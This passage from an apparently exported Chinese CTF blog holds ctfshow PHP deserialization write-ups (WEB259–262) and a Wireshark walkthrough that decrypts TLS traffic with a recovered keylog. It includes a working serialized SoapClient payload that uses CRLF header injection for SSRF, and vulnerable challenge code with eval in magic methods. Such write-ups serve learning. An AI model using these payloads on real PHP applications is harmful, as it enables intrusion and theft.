?&gt;/*?vip=O%3A10%3A&quot;SoapClient&quot;%3A5%3A%7Bs%3A3%3A&quot;uri&quot;%3Bs%3A10%3A&quot;127.0.0.1%2F&quot;%3Bs%3A8%3A&quot;location&quot;%3Bs%3A25%3A&quot;http%3A%2F%2F127.0.0.1%2Fflag.php&quot;%3Bs%3A15%3A&quot;_stream_context&quot;%3Bi%3A0%3Bs%3A11%3A&quot;_user_agent&quot;%3Bs%3A138%3A&quot;ctfshow%0D%0Ax-forwarded-for%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow&quot;%3Bs%3A13%3A&quot;_soap_version&quot;%3Bi%3A1%3B%7D然后访问flag.txt\n\nWEB260&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;    echo $flag;&#125;\n\n直接传入?ctfshow&#x3D; ctfshow_i_love_36D就行\nWEB261&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    &#125;&#125;unserialize($_GET[&#x27;vip&#x27;]); 考点：    如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法， 则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。\n\n\n\nWEB262字符串逃逸\n&lt;?phperror_reporting(0);class message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123;    $msg = new message($f,$m,$t);    $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg));    setcookie(&#x27;msg&#x27;,base64_encode($umsg));    echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__);\n\n这段 PHP 代码的主要功能是接收来自用户通过 GET 请求传递的三个参数 f、m 和 t，并使用这些参数创建一个 message 类的对象。在创建对象后，将对象序列化，把序列化字符串中的 fuck 替换为 loveU，再对处理后的字符串进行 Base64 编码，最后将编码后的结果作为一个名为 msg 的 Cookie 发送给用户。同时，代码还会输出一条消息提示用户消息已发送，并将当前 PHP 文件的源代码高亮显示出来。\n","tags":["-php -反序列化 -web"]},{"title":"软件安全赛复现","url":"/2025/03/24/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"坐牢没解出\n但是赛后看wp思路几乎一致 只差一个5G的小知识点\n\n​\twireshark打开文件\n从头开始捋的话\n我的思路是\n先看到协议 一眼望去都是tcp然后还有一个点是目的ip和源ip都是127.0.0.1----所以默认没用了 然后就看到ICMPv6有TLSv1.2\n\n\n这个时候结合题目5G主题猜也知道关键点就是这个TLS的消息\nTLS流量是指通过TLS协议加密的数据传输，它在客户端和服务器之间建立一个加密的通道，确保数据在传输过程中不被窃听、篡改或伪造。一般的TLS流量就是找到key，导入key，在导入key之后就会多出几个流量包（即加密流量包），在里边会有想要的答案。\n\n\nmisc手的通病 就是工具梭哈试试 所以启动NetA\n\n在这里也是 找到了关键点 也就这个TLS.keylog\n但是当时在现场没有这个知识点 \n\n在NetA和wireshark里面都可以找到有这个TLS.keylog的文件的地方\n\n并且还能找到这个信息 Bob的一句话\n在追踪流SIP流能找到出处\n\n\n追踪完SIP流再看TCP流\n往下翻找\n\n\n\nSERVER HANDSHAKE TRAFFIC SECRET9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER SECRET9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c131882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cfobfe18f0b0SERVER_TRAFFIC_SECRET_09745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c11fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92dc75633bdcf43630CLIENT_HANDSHAKE TRAFFIC SECRET9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0CLIENT_TRAFFIC SECRET O9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n\n把散落的组成并保存成ssl.log\n\n导入：编辑–&gt;首选项–&gt;Protocols–&gt;TLS\n但是遇到了一个问题就是keylog的格式其实有要求的 我自己调试了很多次然后问了C3师傅才成功导入进去正确的格式\nSERVER_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 994da7436ac3193aff9c2ebaa3c072ea2c5b704683928e9f6e24d183e7e530386c1dcd186b9286f98249b4dc90d8b795EXPORTER_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 31882156a3212a425590ce171cb78068ee63e7358b587fed472d45d67ea567d98a079c84867a18665732cf0bfe18f0b0SERVER_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 1fbf7c07ca88c7c91be9cce4c9051f2f4bd7fb9714920661d026119ebab458db8637089348dd5a92dc75633bdcf43630CLIENT_HANDSHAKE_TRAFFIC_SECRET 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 a98fab3039737579a50e2b3d0bbaba7c9fcf6881d26ccf15890b06d723ba605f096dbe448cd9dcc6cf4ef5c82d187bd0CLIENT_TRAFFIC_SECRET_0 9745a631db0b9b715f18a55220e17c88fdf3389c0ee899cfcc45faa8696462c1 646306cb35d94f23e125225dc3d3c727df65b6fcec4c6cd77b6f8e2ff36d48e2b7e92e8f9188597c961866b3b667f405\n\n把这个保存为后缀为log的文件就可以 这个格式正确\n\n\n最后的步骤就很简单了 \n图片出来就是flag了\n","tags":["-WP -MISC -CTF"]}]